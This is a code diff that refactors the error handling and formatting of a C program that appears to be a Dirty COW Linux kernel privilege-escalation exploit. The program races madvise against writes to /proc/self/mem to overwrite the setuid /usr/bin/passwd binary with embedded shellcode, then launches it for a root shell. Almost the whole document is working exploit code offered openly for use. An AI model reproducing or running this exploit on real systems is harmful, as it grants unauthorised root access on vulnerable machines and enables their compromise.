@@ -56,28 +56,29 @@ unsigned char sc[] = {
 unsigned int sc_len = 136;
 #endif
 
-void *madviseThread (void *map) {
+void *madviseThread ( void *map ) {
 
-  while (!stop) {
+  while ( !stop ) {
     madvise (map, sc_len, MADV_DONTNEED);
   }
 
  return NULL;
 }
 
-void *memThread (void *arg) {
+void *memThread ( void *arg ) {
   int mem;
 
-  if ((mem = open ("/proc/self/mem", O_RDWR)) < 0)
-    perror ("Error reading memory map\n");
-  else {
-    while (!stop) {
-      lseek (mem, (off_t)arg, SEEK_SET);
-      write (mem, sc, sc_len);
-    }
-
-    close (mem);
+  if ( (mem = open ( "/proc/self/mem", O_RDWR )) < 0 ) {
+    perror ( "Error reading memory map\n" );
+    return NULL;
   }
+
+  while ( !stop ) {
+    lseek ( mem, (off_t)arg, SEEK_SET );
+    write ( mem, sc, sc_len );
+  }
+
+  close ( mem );
 
  return NULL;
 }
@@ -86,35 +87,33 @@ size_t copyfile (const char *sfile,
                   const char *dstfile) {
   int sf, dst;
   size_t sby, rd = 1024, wr = 0, bytes = 0;
-  char *buf = (char *) calloc ( 1024, sizeof (char) );
+  char buf[1024];
   struct stat st;
 
 
   if ( (sf = open ( sfile, O_RDONLY )) < 0 )
-    return -1;
-  else {
-    if ( fstat ( sf, &st ) < 0 ) return -1;
-    else sby = st.st_size;
-    if ( (dst = open ( dstfile,
-                 O_WRONLY | O_CREAT,
-                  st.st_mode )) < 0 )
-      return -1;
-    else {
-      for ( ;sby; bytes += wr ) {
-        if ( sby < rd )
-          rd = sby;
-        wr = read ( sf, buf, rd );
+    return 0;
 
-        if ( write ( dst, buf, wr ) != wr )
-          return 0;
-        else sby -= wr;
-      }
+  if ( fstat ( sf, &st ) < 0 )
+    return 0;
+  sby = st.st_size;
 
-      close ( sf );
-    }
+  if ( (dst = open ( dstfile,
+                       O_WRONLY | O_CREAT,
+		         st.st_mode )) < 0 )
+      return 0;
+
+  for ( ;sby; bytes += wr ) {
+    if ( sby < rd )
+      rd = sby;
+    wr = read ( sf, buf, rd );
+
+    if ( write ( dst, buf, wr ) != wr )
+      return 0;
+    else sby -= wr;
   }
 
-  free ( buf );
+  close ( sf );
 
  return bytes;  
 }
@@ -122,7 +121,7 @@ size_t copyfile (const char *sfile,
 int main (int argc, char **argv) {
   void *map;
   int p = 0, vuln = 0, dPrg = 0;
-  char *buf = (char *) calloc (sc_len + 1, sizeof (char));
+  char buf[sc_len + 1];
   char *prg = "/usr/bin/passwd", *prgbk = "/tmp/aWtjdX";
   pthread_t pt[2];
   struct stat st;
@@ -134,50 +133,53 @@ int main (int argc, char **argv) {
   else if (argc > 1)
     prg = argv[1];
 
-  if (copy ((const char *)prg, (const char *)prgbk))
-    perror ("Error creating the backup\n");
-  else {
-    printf ("%s -> %s\n", prg, prgbk);
-
-    if ((dPrg = open (prg, O_RDONLY)) < 0)
-      fprintf (stderr, "%s: %s", prg, strerror (errno));
-    else {
-      if (fstat (dPrg, &st) < 0)
-        fprintf (stderr, "%s: %s\n", prg, strerror (errno));
-      else {
-        if ((map = mmap ((void *)0, st.st_size, PROT_READ, MAP_PRIVATE, dPrg, 0)) == MAP_FAILED)
-          perror ("Cannot open a memory map of file\n");
-        else {
-          pthread_create (&pt[0], (void *)0, (void *)&madviseThread, map);
-          pthread_create (&pt[1], (void *)0, (void *)&memThread, map);
-
-          for (p = 0; p < 20; p++) {
-            memset (buf, 0, sc_len);
-
-            read (dPrg, buf, sc_len);
-            lseek (dPrg, (off_t)0, SEEK_SET);
-
-            if (!memcmp (buf, sc, sc_len)) {
-              printf ("Explo%dt executed successfully\n", ++vuln);
-              break;
-            }
-
-            sleep (1);
-          }
-          
-          stop = 1;
-          free (buf);
-        }
-      }
-
-      close (dPrg);
-    }
+  if ( !copyfile ( (const char *)prg, (const char *)prgbk ) ) {
+    perror ( "Error creating the backup\n" );
+    return -1;
   }
 
+  printf ( "%s -> %s\n", prg, prgbk );
+
+  if ( (dPrg = open ( prg, O_RDONLY )) < 0 ) {
+    fprintf ( stderr, "%s: %s", prg, strerror ( errno ) );
+    return -1;
+  }
+
+  if ( fstat ( dPrg, &st ) < 0 ) {
+    fprintf ( stderr, "%s: %s\n", prg, strerror ( errno ) );
+    return -1;
+  }
+
+  if ( (map = mmap ((void *)0, st.st_size,
+                PROT_READ, MAP_PRIVATE, dPrg, 0 )) == MAP_FAILED ) {
+    perror ( "Cannot open a memory map of file\n" );
+    return -1;
+  }
+
+  pthread_create ( &pt[0], (void *)0, (void *)&madviseThread, map );
+  pthread_create ( &pt[1], (void *)0, (void *)&memThread, map );
+
+  for ( p = 0; p < 20; p++ ) {
+    memset ( buf, 0, sc_len );
+
+    read ( dPrg, buf, sc_len );
+    lseek ( dPrg, (off_t)0, SEEK_SET );
+
+    if ( !memcmp ( buf, sc, sc_len ) ) {
+      printf ( "Explo%dt executed successfully\n", ++vuln );
+      break;
+    }
+
+    sleep ( 1 );
+  }
+          
+  stop = 1;
+  close ( dPrg );
+
   if (vuln)
-    system (prg);
+    system ( prg );
   else
-    printf ("System is not vulnerable\n");
+    return fprintf ( stderr, "System is not vulnerable\n" );
 
  return 0;
 }
